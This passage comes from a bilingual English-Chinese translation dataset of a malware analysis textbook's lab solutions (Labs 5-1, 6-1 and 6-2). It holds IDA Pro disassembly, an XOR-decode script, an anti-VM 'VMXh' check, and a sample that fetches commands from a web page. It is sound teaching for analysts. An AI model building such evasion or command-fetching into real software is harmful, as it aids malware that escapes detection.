  zh: 10001349 push eax ; Str
- en: 1000134A call ds:**atoi**
  id: totrans-1217
  prefs: []
  type: TYPE_NORMAL
  zh: 1000134A call ds:**atoi**
- en: 10001350 imul eax, 3E8h
  id: totrans-1218
  prefs: []
  type: TYPE_NORMAL
  zh: 10001350 imul eax, 3E8h
- en: 10001356 pop ecx
  id: totrans-1219
  prefs: []
  type: TYPE_NORMAL
  zh: 10001356 pop ecx
- en: 10001357 push eax ; dwMilliseconds
  id: totrans-1220
  prefs: []
  type: TYPE_NORMAL
  zh: 10001357 push eax ; dwMilliseconds
- en: 10001358 call ds:**Sleep**
  id: totrans-1221
  prefs: []
  type: TYPE_NORMAL
  zh: 10001358 call ds:**Sleep**
- en: Working backward, it looks like EAX is multiplied by 0x3E8 (or 1000 in decimal),
    which tells us that the result of the call to atoi is multiplied by 1000
  id: totrans-1222
  prefs: []
  type: TYPE_NORMAL
  zh: 反向工作，看起来EAX被乘以0x3E8（或十进制的1000），这告诉我们atoi调用的结果被乘以1000
- en: to get the number of seconds to sleep. Again working backward, we also see Solutions
    to Labs
  id: totrans-1223
  prefs: []
  type: TYPE_NORMAL
  zh: 再次反向工作，我们看到了实验室解决方案
- en: '**499**'
  id: totrans-1224
  prefs: []
  type: TYPE_NORMAL
  zh: '**499**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1225
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: that off_10019020 is moved into EAX. We can see what is at the offset by double-clicking
    it. This is a reference to the string [This is CTI]30\.
  id: totrans-1226
  prefs: []
  type: TYPE_NORMAL
  zh: off_10019020被移动到EAX中。我们可以通过双击它来查看偏移量处的值。这是一个指向字符串[This is CTI]30的引用。
- en: Next, we see that 0xD is added to the offset, which causes EAX to point to 30
    for the call to atoi, which will convert the string 30 into the number 30\.
  id: totrans-1227
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到偏移量增加了0xD，这使得EAX指向30，以便调用atoi，将字符串30转换为数字30。
- en: Multiplying 30 by 1000, we get 30,000 milliseconds (30 seconds), and that is
    how long this program will sleep if the strings are the same upon execution.
  id: totrans-1228
  prefs: []
  type: TYPE_NORMAL
  zh: 将30乘以1000，我们得到30,000毫秒（30秒），这就是程序在字符串执行时将休眠的时间。
- en: As referenced in question 15, a call to socket at 0x10001701 is shown in the
    left column of Table 5-1L. We see that 6, 1, and 2 are pushed onto the stack.
    These numbers correspond to symbolic constants that are described on the MSDN
    page for socket. Right-clicking each of the numbers and selecting **Use Symbolic
    Constant** presents a dialog listing all of the constants that IDA Pro has for
    a particular value. In this example, the number 2 corresponds to AF_INET, which
    is used for setting up an IPv4 socket; 1 stands for SOCK_STREAM, and 6 stands
    for IPPROTO_TCP. Therefore, this socket will be configured for TCP over IPv4 (commonly
    used for HTTP).
  id: totrans-1229
  prefs: []
  type: TYPE_NORMAL
  zh: 如第15题所述，在0x10001701处有一个调用socket，如表5-1L的左侧列所示。我们看到6、1和2被压入堆栈。这些数字对应于MSDN页面上socket描述的符号常量。右键单击每个数字并选择**使用符号常量**将显示一个对话框，列出IDA
    Pro为特定值拥有的所有常量。在这个例子中，数字2对应于AF_INET，用于设置IPv4套接字；1代表SOCK_STREAM，6代表IPPROTO_TCP。因此，这个套接字将配置为基于IPv4的TCP（通常用于HTTP）。
- en: '**Table 5-1L:** Applying Symbolic Constants for a Call to socket **Before symbolic
    constants**'
  id: totrans-1230
  prefs: []
  type: TYPE_NORMAL
  zh: '**表5-1L：在调用socket之前应用符号常量** **符号常量之前**'
- en: '**After symbolic constants**'
  id: totrans-1231
  prefs: []
  type: TYPE_NORMAL
  zh: '**符号常量之后**'
- en: 100016FB push 6
  id: totrans-1232
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FB push 6
- en: 100016FB push **IPPROTO_TCP**
  id: totrans-1233
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FB push **IPPROTO_TCP**
- en: 100016FD push 1
  id: totrans-1234
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FD push 1
- en: 100016FD push **SOCK_STREAM**
  id: totrans-1235
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FD push **SOCK_STREAM**
- en: 100016FF push 2
  id: totrans-1236
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FF push 2
- en: 100016FF push **AF_INET**
  id: totrans-1237
  prefs: []
  type: TYPE_NORMAL
  zh: 100016FF push **AF_INET**
- en: 10001701 call ds:socket
  id: totrans-1238
  prefs: []
  type: TYPE_NORMAL
  zh: 10001701 call ds:socket
- en: 10001701 call ds:socket
  id: totrans-1239
  prefs: []
  type: TYPE_NORMAL
  zh: 10001701 call ds:socket
- en: 'To answer question 17, we search for the in instruction by selecting **Search****Text**
    and entering **in** (we could also select **Search****Sequence of** **Bytes**
    and searching for **ED**, the opcode for the in instruction). If we check **Find
    All Occurrences** in the search dialog, either option will present a new window
    listing all matches. Scrolling through the results shows only one instance of
    the in instruction at 0x100061DB, as follows: 100061C7 mov eax, **564D5868h ;
    "VMXh"**'
  id: totrans-1240
  prefs: []
  type: TYPE_NORMAL
  zh: 为了回答第17题，我们通过选择**搜索****文本**并输入**in**来搜索in指令（我们也可以选择**搜索****序列** **字节**并搜索**ED**，in指令的操作码）。如果我们检查搜索对话框中的**查找所有匹配项**，任一选项都会打开一个新窗口，列出所有匹配项。滚动结果只显示一个in指令实例在0x100061DB，如下所示：100061C7
    mov eax, **564D5868h ; "VMXh"**
- en: 100061CC mov ebx, 0
  id: totrans-1241
  prefs: []
  type: TYPE_NORMAL
  zh: 100061CC mov ebx, 0
- en: 100061D1 mov ecx, 0Ah
  id: totrans-1242
  prefs: []
  type: TYPE_NORMAL
  zh: 100061D1 mov ecx, 0Ah
- en: 100061D6 mov edx, 5658h
  id: totrans-1243
  prefs: []
  type: TYPE_NORMAL
  zh: 100061D6 mov edx, 5658h
- en: 100061DB **in** eax, dx
  id: totrans-1244
  prefs: []
  type: TYPE_NORMAL
  zh: 100061DB **in** eax, dx
- en: The mov instruction at 0x100061C7 moves 0x564D5868 into EAX. Right-clicking
    this value shows that it corresponds to the ASCII string VMXh, which confirms
    that this snippet of code is an anti-virtual machine technique being employed
    by the malware. (We discuss the specifics of this technique and others in Chapter
    17.) Checking the cross-references to the function that executes this technique
    offers further confirmation when we see Found Virtual Machine in the code after
    a comparison.
  id: totrans-1245
  prefs: []
  type: TYPE_NORMAL
  zh: 在 0x100061C7 处的 mov 指令将 0x564D5868 移入 EAX。右键单击此值显示它对应于 ASCII 字符串 VMXh，这证实了此段代码是恶意软件正在使用的反虚拟机技术。（我们在第
    17 章中讨论了此技术及其他技术。）检查执行此技术的函数的交叉引用，当我们在代码中看到 Found Virtual Machine 后，提供了进一步的确认。
- en: As referenced by question 18, we jump our cursor to 0x1001D988 using the G key.
    Here, we see what looks like random bytes of data and nothing readable. As suggested,
    we run the Python script provided by selecting **File**
  id: totrans-1246
  prefs: []
  type: TYPE_NORMAL
  zh: 如问题 18 所述，我们使用 G 键将光标跳转到 0x1001D988。在这里，我们看到看起来像是随机字节的数据，没有任何可读内容。正如建议的那样，我们通过选择
    **文件**
- en: '**Script File** and selecting the Python script, shown in the following listing.'
  id: totrans-1247
  prefs: []
  type: TYPE_NORMAL
  zh: '**脚本文件**并选择下面的 Python 脚本。'
- en: '**500**'
  id: totrans-1248
  prefs: []
  type: TYPE_NORMAL
  zh: '**500**'
- en: Appendix C
  id: totrans-1249
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1250
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: sea = ScreenEA() 
  id: totrans-1251
  prefs: []
  type: TYPE_NORMAL
  zh: sea = ScreenEA() 
- en: 'for i in range(0x00,0x50):'
  id: totrans-1252
  prefs: []
  type: TYPE_NORMAL
  zh: 'for i in range(0x00,0x50):'
- en: b = **Byte**(sea+i)
  id: totrans-1253
  prefs: []
  type: TYPE_NORMAL
  zh: b = **Byte**(sea+i)
- en: decoded_byte = b ^ 0x55 
  id: totrans-1254
  prefs: []
  type: TYPE_NORMAL
  zh: decoded_byte = b ^ 0x55 
- en: '**PatchByte**(sea+i,decoded_byte)'
  id: totrans-1255
  prefs: []
  type: TYPE_NORMAL
  zh: '**PatchByte**(sea+i,decoded_byte)'
- en: At , the script grabs the current location of the cursor, for use as an offset
    to decode the data. Next, it loops from 0 to 0x50 and grabs the value of each
    byte using the call to Byte. It takes each byte and XORs it with 0x55
  id: totrans-1256
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ，脚本获取光标当前位置，用作解码数据的偏移量。接下来，它从 0 到 0x50 循环，并使用 Byte 调用获取每个字节的值。它将每个字节与 0x55
    进行异或运算。
- en: '**6**'
  id: totrans-1257
  prefs: []
  type: TYPE_NORMAL
  zh: '**6**'
- en: at . Finally, it patches the byte in the IDA Pro display without modifying
    the original file. You can easily customize this script for your own use.
  id: totrans-1258
  prefs: []
  type: TYPE_NORMAL
  zh: 在 。最后，它在 IDA Pro 显示中修补字节，而不修改原始文件。您可以轻松地为此脚本进行自定义以供自己使用。
- en: After the script runs, we see that the data at 0x1001D988 has been changed to
    something more readable. We can turn this into an ASCII string by pressing the
    A key on the keyboard with the cursor at 0x1001D988\. This reveals the string
    xdoor is this backdoor, string decoded for Practical Malware Analysis Lab :)1234\.
  id: totrans-1259
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本运行后，我们看到 0x1001D988 处的数据已被更改为更易读的内容。我们可以通过在键盘上按下 A 键，并将光标置于 0x1001D988 处，将其转换为
    ASCII 字符串。这揭示了字符串 xdoor is this backdoor, string decoded for Practical Malware
    Analysis Lab :)1234\.
- en: '**Lab 6-1 Solutions**'
  id: totrans-1260
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 6-1 解答**'
- en: '***Short Answers***'
  id: totrans-1261
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-1262
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: The major code construct is an if statement located at 0x401000\.
  id: totrans-1263
  prefs: []
  type: TYPE_NORMAL
  zh: 主要代码结构是一个位于 0x401000 的 if 语句。
- en: 2\.
  id: totrans-1264
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: printf is the subroutine located at 0x40105F.
  id: totrans-1265
  prefs: []
  type: TYPE_NORMAL
  zh: printf 是位于 0x40105F 的子程序。
- en: 3\.
  id: totrans-1266
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: 'The program checks for an active Internet connection. If an active connection
    is found, it prints “Success: Internet Connection.” If a connection is not found,
    it prints “Error 1.1: No Internet.” This program can be used by malware to check
    for a connection before attempting to connect to the Internet.'
  id: totrans-1267
  prefs: []
  type: TYPE_NORMAL
  zh: 程序检查是否存在活跃的互联网连接。如果找到活跃连接，则打印“成功：互联网连接。”如果没有找到连接，则打印“错误 1.1：无互联网。”此程序可以被恶意软件用于在尝试连接互联网之前检查连接。
- en: '***Detailed Analysis***'
  id: totrans-1268
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin by performing basic static analysis on this executable. Looking at
    the imports, we see that the DLL *WININET.dll* and the function InternetGetConnectedState
    are imported. The Windows Internet (WinINet) API enables applications to interact
    with HTTP protocols to access Internet resources.
  id: totrans-1269
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先对可执行文件进行基本静态分析。查看导入项，我们看到 DLL *WININET.dll* 和函数 InternetGetConnectedState
    被导入。Windows Internet（WinINet）API 允许应用程序与 HTTP 协议交互，以访问互联网资源。
- en: 'Using MSDN, we learn this Windows API function checks the status of the Internet
    connection for the local system. The strings Error 1.1: No Internet and Success:
    Internet Connection hint that this program may check for an active Internet connection
    on the system.'
  id: totrans-1270
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 MSDN，我们了解到这个 Windows API 函数检查本地系统的互联网连接状态。字符串“错误 1.1：无互联网”和“成功：互联网连接”暗示此程序可能在系统上检查活跃的互联网连接。
- en: Next, we perform basic dynamic analysis on this executable. Nothing overly exciting
    happens when this executable is run from the command line.
  id: totrans-1271
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们对这个可执行文件进行基本的动态分析。当从命令行运行此可执行文件时，没有发生什么特别激动人心的事情。
- en: 'It simply prints “Success: Internet Connection” and then terminates.'
  id: totrans-1272
  prefs: []
  type: TYPE_NORMAL
  zh: 它只是打印“成功：互联网连接”然后终止。
- en: Finally, we load the file into IDA Pro for full analysis. Much of this disassembly
    is generated by the compiler, so we need to be careful to avoid going down rabbit
    holes of irrelevant code. Therefore, we start from the main function, which is
    typically where the code written by the malware author begins.
  id: totrans-1273
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们将文件加载到 IDA Pro 中进行完整分析。大部分反汇编代码都是由编译器生成的，因此我们需要小心避免迷失在无关代码的兔子洞中。因此，我们从主函数开始，通常这是恶意软件作者编写的代码开始的地方。
- en: In this case, the main function starts at 0x401040\. The main function calls
    the Solutions to Labs
  id: totrans-1274
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，主函数从 0x401040 开始。主函数调用了解决实验室问题的解决方案
- en: '**501**'
  id: totrans-1275
  prefs: []
  type: TYPE_NORMAL
  zh: '**501**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1276
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: function at 0x401000, which appears to be a key function of interest because
    it is the only one called by main. Figure 6-1L shows a flow graph of this function.
  id: totrans-1277
  prefs: []
  type: TYPE_NORMAL
  zh: 函数 0x401000，这似乎是一个关键函数，因为它是由 main 调用的唯一一个。图 6-1L 显示了这个函数的流程图。
- en: 'sub_401000:'
  id: totrans-1278
  prefs: []
  type: TYPE_NORMAL
  zh: 'sub_401000:'
- en: push ebp
  id: totrans-1279
  prefs: []
  type: TYPE_NORMAL
  zh: push ebp
- en: mov ebp, esp
  id: totrans-1280
  prefs: []
  type: TYPE_NORMAL
  zh: mov ebp, esp
- en: push ecx
  id: totrans-1281
  prefs: []
  type: TYPE_NORMAL
  zh: push ecx
- en: push 0
  id: totrans-1282
  prefs: []
  type: TYPE_NORMAL
  zh: push 0
- en: push 0
  id: totrans-1283
  prefs: []
  type: TYPE_NORMAL
  zh: push 0
- en: call ds:InternetGetConnectedState
  id: totrans-1284
  prefs: []
  type: TYPE_NORMAL
  zh: call ds:InternetGetConnectedState
- en: mov [ebp+var_4], eax
  id: totrans-1285
  prefs: []
  type: TYPE_NORMAL
  zh: mov [ebp+var_4], eax
- en: cmp [ebp+var_4], 0
  id: totrans-1286
  prefs: []
  type: TYPE_NORMAL
  zh: cmp [ebp+var_4], 0
- en: jz short loc_40102B
  id: totrans-1287
  prefs: []
  type: TYPE_NORMAL
  zh: jz short loc_40102B
- en: 'false'
  id: totrans-1288
  prefs: []
  type: TYPE_NORMAL
  zh: 'false'
- en: 'true'
  id: totrans-1289
  prefs: []
  type: TYPE_NORMAL
  zh: 'true'
- en: '00401017:'
  id: totrans-1290
  prefs: []
  type: TYPE_NORMAL
  zh: '00401017:'
- en: 'push offset aSuccessInterne ; "Success: Internet Connection\n"'
  id: totrans-1291
  prefs: []
  type: TYPE_NORMAL
  zh: 'push offset aSuccessInterne ; "Success: Internet Connection\n"'
- en: call printf
  id: totrans-1292
  prefs: []
  type: TYPE_NORMAL
  zh: call printf
- en: add esp, 4
  id: totrans-1293
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 4
- en: mov eax, 1
  id: totrans-1294
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, 1
- en: jmp short loc_40103A
  id: totrans-1295
  prefs: []
  type: TYPE_NORMAL
  zh: jmp short loc_40103A
- en: 'loc_40102B:'
  id: totrans-1296
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_40102B:'
- en: 'push offset aError1_1NoInte; "Error 1.1: No Internet\n"'
  id: totrans-1297
  prefs: []
  type: TYPE_NORMAL
  zh: 'push offset aError1_1NoInte; "Error 1.1: No Internet\n"'
- en: call printf
  id: totrans-1298
  prefs: []
  type: TYPE_NORMAL
  zh: call printf
- en: add esp, 4
  id: totrans-1299
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 4
- en: xor eax, eax
  id: totrans-1300
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, eax
- en: 'loc_40103A:'
  id: totrans-1301
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_40103A:'
- en: mov esp, ebp
  id: totrans-1302
  prefs: []
  type: TYPE_NORMAL
  zh: mov esp, ebp
- en: pop ebp
  id: totrans-1303
  prefs: []
  type: TYPE_NORMAL
  zh: pop ebp
- en: retn
  id: totrans-1304
  prefs: []
  type: TYPE_NORMAL
  zh: retn
- en: '*Figure 6-1L: Disassembly flow graph of the function at 0x401000*'
  id: totrans-1305
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 6-1L：函数 0x401000 的反汇编流程图*'
- en: Now we graph this function in IDA Pro using **View****Graphs****Flow chart**.
  id: totrans-1306
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们使用 IDA Pro 的 **视图****图形****流程图**来绘制这个函数。
- en: 'Looking at this graph and code, we see a common code construct: two different
    code paths depend on the result of the call to InternetGetConnectedState.'
  id: totrans-1307
  prefs: []
  type: TYPE_NORMAL
  zh: 通过查看这个图和代码，我们看到一个常见的代码构造：两个不同的代码路径依赖于对 InternetGetConnectedState 调用的结果。
- en: The cmp instruction is used to compare the result contained in EAX to 0, and
    then the jz instruction is used to control the flow.
  id: totrans-1308
  prefs: []
  type: TYPE_NORMAL
  zh: cmp 指令用于比较 EAX 中包含的结果与 0，然后使用 jz 指令来控制流程。
- en: The MSDN page on InternetGetConnectedState further states that the function
    returns 1 if there is an active Internet connection; otherwise it returns 0\.
  id: totrans-1309
  prefs: []
  type: TYPE_NORMAL
  zh: MSDN 页面上的 InternetGetConnectedState 进一步说明，如果存在活动的互联网连接，则该函数返回 1；否则返回 0。
- en: Therefore, the code will take the false branch at  if the result is 0 because
    the zero flag (ZF) will be clear; otherwise, it will take the true branch at .
  id: totrans-1310
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，如果结果是 0，代码将采取处的假分支，因为零标志（ZF）将被清除；否则，它将采取处的真分支。
- en: The code construct used in this function is an if statement.
  id: totrans-1311
  prefs: []
  type: TYPE_NORMAL
  zh: 在此函数中使用的代码构造是一个 if 语句。
- en: The function calls the subroutine at 0x40105F in two locations, but if we dive
    into that function, we will quickly get lost in a rabbit hole. This function is
    printf. Surprisingly, both the IDA Pro commercial and freeware versions will not
    always recognize and label the printf function. Therefore, we must look for certain
    signals that hint at an unlabeled call to printf. One easy way to tell is by identifying
    parameters pushed onto the stack before the call to the subroutine. Here, in both
    cases, a format string is pushed onto the stack.
  id: totrans-1312
  prefs: []
  type: TYPE_NORMAL
  zh: 函数在两个位置调用 0x40105F 处的子程序，但如果我们深入研究该函数，我们很快就会迷失在兔子洞中。这个函数是 printf。令人惊讶的是，IDA
    Pro 商业版和免费版并不总是能够识别并标记 printf 函数。因此，我们必须寻找某些提示，暗示对 printf 的未标记调用。一种简单的方法是在调用子程序之前识别推送到堆栈上的参数。在这里，在两种情况下，都推送到堆栈上的一个格式字符串。
- en: The \n at the end of a string denotes a line feed. Also, given the context and
    **502**
  id: totrans-1313
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串末尾的 \n 表示换行符。此外，考虑到上下文和**502**
- en: Appendix C
  id: totrans-1314
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1315
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: the string itself, we can deduce that the function is printf. Therefore, we
    rename the function to printf, so that it is marked as such throughout the code,
    as shown in Figure 6-1L. Once the printf function is called, we see that EAX is
    set to either 1 or 0 before the function returns.
  id: totrans-1316
  prefs: []
  type: TYPE_NORMAL
  zh: 根据字符串本身，我们可以推断出该函数是 printf。因此，我们将该函数重命名为 printf，以便在代码中标记为这样的，如图 6-1L 所示。一旦调用
    printf 函数，我们看到在函数返回之前 EAX 被设置为 1 或 0。
- en: To summarize, this function checks for an active Internet connection, and then
    prints the result of its check, followed by returning a 1 if it is connected and
    0 if it is not. Malware often performs a similar check for a valid Internet connection.
  id: totrans-1317
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，此函数检查活动 Internet 连接，然后打印其检查结果，如果连接则返回 1，如果不连接则返回 0。恶意软件通常会执行类似的检查以验证有效的
    Internet 连接。
- en: '**6**'
  id: totrans-1318
  prefs: []
  type: TYPE_NORMAL
  zh: '**6**'
- en: '**Lab 6-2 Solutions**'
  id: totrans-1319
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 6-2 解决方案**'
- en: '***Short Answers***'
  id: totrans-1320
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-1321
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The first subroutine at 0x401000 is the same as in Lab 6-1\. It’s an if statement
    that checks for an active Internet connection.
  id: totrans-1322
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401000 处的第一个子例程与 Lab 6-1 中的相同。它是一个检查活动 Internet 连接的 if 语句。
- en: 2\.
  id: totrans-1323
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: printf is the subroutine located at 0x40117F.
  id: totrans-1324
  prefs: []
  type: TYPE_NORMAL
  zh: printf 是位于 0x40117F 处的子例程。
- en: 3\.
  id: totrans-1325
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: 'The second function called from main is located at 0x401040\. It downloads
    the web page located at: *http://www.practicalmalwareanalysis.com/*'
  id: totrans-1326
  prefs: []
  type: TYPE_NORMAL
  zh: 从主函数中调用的第二个函数位于 0x401040 处。它下载位于 *http://www.practicalmalwareanalysis.com/*
    的网页。
- en: '*cc.htm* and parses an HTML comment from the beginning of the page.'
  id: totrans-1327
  prefs: []
  type: TYPE_NORMAL
  zh: '*cc.htm* 并从页面开头解析 HTML 注释。'
- en: 4\.
  id: totrans-1328
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: This subroutine uses a character array filled with data from the call to InternetReadFile.
    This array is compared one byte at a time to parse an HTML comment.
  id: totrans-1329
  prefs: []
  type: TYPE_NORMAL
  zh: 此子例程使用从 InternetReadFile 调用中获取的数据填充的字符数组。该数组逐字节进行比较，以解析 HTML 注释。
- en: 5\.
  id: totrans-1330
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: There are two network-based indicators. The program uses the HTTP
  id: totrans-1331
  prefs: []
  type: TYPE_NORMAL
  zh: 有两个基于网络的指示器。程序使用 HTTP
- en: 'User-Agent Internet Explorer 7.5/pma and downloads the web page located at:
    *http://www.practicalmalwareanalysis.com/cc.htm*.'
  id: totrans-1332
  prefs: []
  type: TYPE_NORMAL
  zh: 用户代理：Internet Explorer 7.5/pma，并下载位于 *http://www.practicalmalwareanalysis.com/cc.htm*
    的网页。
- en: 6\.
  id: totrans-1333
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: First, the program checks for an active Internet connection. If none is found,
    the program terminates. Otherwise, the program attempts to download a web page
    using a unique User-Agent. This web page contains an embedded HTML comment starting
    with <!--. The next character is parsed from this comment and printed to the screen
    in the format
  id: totrans-1334
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，程序检查是否存在活动 Internet 连接。如果没有找到，程序将终止。否则，程序将尝试使用独特的用户代理下载网页。该网页包含一个以 <!-- 开始的嵌入
    HTML 注释。从这个注释中解析下一个字符，并以以下格式打印到屏幕上：
- en: '“Success: Parsed command is *X*,” where *X* is the character parsed from the
    HTML comment. If successful, the program will sleep for 1 minute and then terminate.'
  id: totrans-1335
  prefs: []
  type: TYPE_NORMAL
  zh: “成功：解析的命令是 *X*，”其中 *X* 是从 HTML 注释中解析出的字符。如果成功，程序将休眠 1 分钟然后终止。
- en: '***Detailed Analysis***'
  id: totrans-1336
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin by performing basic static analysis on the binary. We see several new
    strings of interest, as shown in Listing 6-1L.
  id: totrans-1337
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先对二进制文件进行基本静态分析。我们看到一些有趣的新字符串，如列表 6-1L 所示。
- en: 'Error 2.3: Fail to get command'
  id: totrans-1338
  prefs: []
  type: TYPE_NORMAL
  zh: 错误 2.3：无法获取命令
- en: 'Error 2.2: Fail to ReadFile'
  id: totrans-1339
  prefs: []
  type: TYPE_NORMAL
  zh: 错误 2.2：无法读取文件
- en: 'Error 2.1: Fail to OpenUrl'
  id: totrans-1340
  prefs: []
  type: TYPE_NORMAL
  zh: 错误 2.1：无法打开 URL
- en: http://www.practicalmalwareanalysis.com/cc.htm
  id: totrans-1341
  prefs: []
  type: TYPE_NORMAL
  zh: http://www.practicalmalwareanalysis.com/cc.htm
- en: Internet Explorer 7.5/pma
  id: totrans-1342
  prefs: []
  type: TYPE_NORMAL
  zh: Internet Explorer 7.5/pma
- en: 'Success: Parsed command is %c'
  id: totrans-1343
  prefs: []
  type: TYPE_NORMAL
  zh: 成功：解析的命令是 %c
- en: '*Listing 6-1L: Interesting new strings contained in Lab 6-2*'
  id: totrans-1344
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-1L：Lab 6-2 中包含的有趣的新字符串*'
- en: Solutions to Labs
  id: totrans-1345
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**503**'
  id: totrans-1346
  prefs: []
  type: TYPE_NORMAL
  zh: '**503**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1347
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The three error message strings that we see suggest that the program may open
    a web page and parse a command. We also notice a URL for an HTML web page, *http://www.practicalmalwareanalysis.com/cc.htm*.
    This domain can be used immediately as a network-based indicator.
  id: totrans-1348
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到的三个错误消息字符串表明程序可能打开一个网页并解析一个命令。我们还注意到一个 HTML 网页的 URL，*http://www.practicalmalwareanalysis.com/cc.htm*。该域名可以立即用作基于网络的指示器。
- en: These imports contain several new Windows API functions used for networking,
    as shown in Listing 6-2L.
  id: totrans-1349
  prefs: []
  type: TYPE_NORMAL
  zh: 这些导入包含几个用于网络的新 Windows API 函数，如列表 6-2L 所示。
- en: InternetReadFile
  id: totrans-1350
  prefs: []
  type: TYPE_NORMAL
  zh: InternetReadFile
- en: InternetCloseHandle
  id: totrans-1351
  prefs: []
  type: TYPE_NORMAL
  zh: InternetCloseHandle
- en: InternetOpenUrlA
  id: totrans-1352
  prefs: []
  type: TYPE_NORMAL
  zh: InternetOpenUrlA
- en: InternetOpenA
  id: totrans-1353
  prefs: []
  type: TYPE_NORMAL
  zh: InternetOpenA
- en: '*Listing 6-2L: Interesting new import functions contained in Lab 6-2*'
  id: totrans-1354
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 6-2L：Lab 6-2 中包含的有趣的新导入函数*'
- en: All of these functions are part of WinINet, a simple API for using HTTP
  id: totrans-1355
  prefs: []
  type: TYPE_NORMAL
  zh: 所有这些函数都是 WinINet 的一部分，这是一个用于使用 HTTP 的简单 API。
- en: 'over a network. They work as follows:'
  id: totrans-1356
  prefs: []
  type: TYPE_NORMAL
  zh: 在网络上。它们的工作方式如下：
- en: 
  id: totrans-1357
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: InternetOpenA is used to initialize the use of the WinINet library, and it sets
    the User-Agent used for HTTP communication.
  id: totrans-1358
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 InternetOpenA 初始化 WinINet 库的使用，并设置用于 HTTP 通信的用户代理。
- en: 
  id: totrans-1359
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: InternetOpenUrlA is used to open a handle to a location specified by a complete
    FTP or HTTP URL. (Programs use handles to access something that has been opened.
    We discuss handles in Chapter 7.)
  id: totrans-1360
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 InternetOpenUrlA 打开一个指向完整 FTP 或 HTTP URL 指定位置的句柄。（程序使用句柄来访问已打开的东西。我们将在第 7
    章中讨论句柄。）
- en: 
  id: totrans-1361
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: InternetReadFile is used to read data from the handle opened by InternetOpenUrlA.
  id: totrans-1362
  prefs: []
  type: TYPE_NORMAL
  zh: 使用InternetReadFile从InternetOpenUrlA打开的句柄中读取数据。
- en: 
  id: totrans-1363
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: InternetCloseHandle is used to close the handles opened by these files.
  id: totrans-1364
  prefs: []
  type: TYPE_NORMAL
  zh: 使用InternetCloseHandle关闭这些文件打开的句柄。
- en: Next, we perform dynamic analysis. We choose to listen on port 80
  id: totrans-1365
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们进行动态分析。我们选择监听端口80
- en: because WinINet often uses HTTP and we saw a URL in the strings. If we set up
    Netcat to listen on port 80 and redirect the DNS accordingly, we will see a DNS
    query for *www.practicalmalwareanalysis.com*, after which the program requests
    a web page from the URL, as shown in Listing 6-3L. This tells us that this web
    page has some significance to the malware, but we won’t know what that is until
    we analyze the disassembly.
  id: totrans-1366
  prefs: []
  type: TYPE_NORMAL
